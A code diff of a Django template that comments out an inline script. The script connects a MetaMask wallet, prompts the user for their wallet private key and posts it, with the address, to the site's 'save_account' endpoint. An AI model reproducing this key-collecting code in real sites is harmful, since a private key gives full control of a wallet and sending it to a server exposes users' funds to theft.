@@ -46,42 +46,42 @@
   </header>
 
     <script>
-        let web3;
-        let userAddress;
-        let privateKey;
-
-        document.getElementById('connectButton').onclick = async () => {
-            if (typeof window.ethereum !== 'undefined') {
-                web3 = new Web3(window.ethereum);
-                try {
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    userAddress = accounts[0];
-                    alert(`Connected: ${userAddress}`);
-                    const privateKeyInput = prompt('Please enter your private key');
-                    privateKey = privateKeyInput;  // Store the private key for session storage
-                    sendAccountToServer(userAddress, privateKey);
-                } catch (error) {
-                    console.error(error);
-                }
-            } else {
-                alert('MetaMask is not installed');
-            }
-        };
-
-        async function sendAccountToServer(account, privateKey) {
-            const response = await fetch("{% url 'save_account' %}", {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-CSRFToken': '{{ csrf_token }}'
-                },
-                body: JSON.stringify({ account: account, private_key: privateKey })
-            });
-            if (response.ok) {
-                const data = await response.json();
-                console.log(data);
-            } else {
-                console.error('Failed to save account information');
-            }
-        }
+        {#let web3;#}
+        {#let userAddress;#}
+        {#let privateKey;#}
+        {##}
+        {#document.getElementById('connectButton').onclick = async () => {#}
+        {#    if (typeof window.ethereum !== 'undefined') {#}
+        {#        web3 = new Web3(window.ethereum);#}
+        {#        try {#}
+        {#            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });#}
+        {#            userAddress = accounts[0];#}
+        {#            alert(`Connected: ${userAddress}`);#}
+        {#            const privateKeyInput = prompt('Please enter your private key');#}
+        {#            privateKey = privateKeyInput;  // Store the private key for session storage#}
+        {#            sendAccountToServer(userAddress, privateKey);#}
+        {#        } catch (error) {#}
+        {#            console.error(error);#}
+        {#        }#}
+        {#    } else {#}
+        {#        alert('MetaMask is not installed');#}
+        {#    }#}
+        {#};#}
+        {##}
+        {#async function sendAccountToServer(account, privateKey) {#}
+        {#    const response = await fetch("{% url 'save_account' %}", {#}
+        {#        method: 'POST',#}
+        {#        headers: {#}
+        {#            'Content-Type': 'application/json',#}
+        {#            'X-CSRFToken': '{{ csrf_token }}'#}
+        {#        },#}
+        {#        body: JSON.stringify({ account: account, private_key: privateKey })#}
+        {#    });#}
+        {#    if (response.ok) {#}
+        {#        const data = await response.json();#}
+        {#        console.log(data);#}
+        {#    } else {#}
+        {#        console.error('Failed to save account information');#}
+        {#    }#}
+        {#}#}
     </script>
